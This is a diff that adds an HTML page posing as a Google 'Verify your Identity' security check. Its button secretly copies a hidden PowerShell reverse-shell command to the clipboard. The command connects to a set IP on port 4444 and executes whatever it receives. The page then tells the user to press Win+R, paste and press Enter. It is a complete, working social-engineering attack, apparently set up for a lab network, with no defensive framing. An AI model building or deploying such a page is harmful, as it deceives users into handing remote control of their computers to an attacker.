@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; margin-top: 100px; background: #f9f9f9; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        button { background: #4285f4; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .instructions { display: none; background: #fff3cd; padding: 15px; margin-top: 15px; border: 1px solid #ffeeba; text-align: left; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+        <h3>Verify your Identity</h3>
+        <p id="msg">Click below to fix a browser connection error.</p>
+        <button id="btn" onclick="copyAndTrap()">Fix Connection</button>
+
+        <div id="steps" class="instructions">
+            <strong>Manual Fix Required:</strong><br>
+            1. Press <b>Win + R</b> on your keyboard.<br>
+            2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
+            3. Press <b>Enter</b> to verify.
+        </div>
+    </div>
+
+    <script>
+        function copyAndTrap() {
+            // REPLACE 'YOUR_IP_HERE' with your main computer's internal IP address
+            const ip = "192.168.40.136"; 
+            const cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
+
+            navigator.clipboard.writeText(cmd).then(() => {
+                document.getElementById('btn').style.display = 'none';
+                document.getElementById('msg').innerText = "Follow the steps to complete verification:";
+                document.getElementById('steps').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
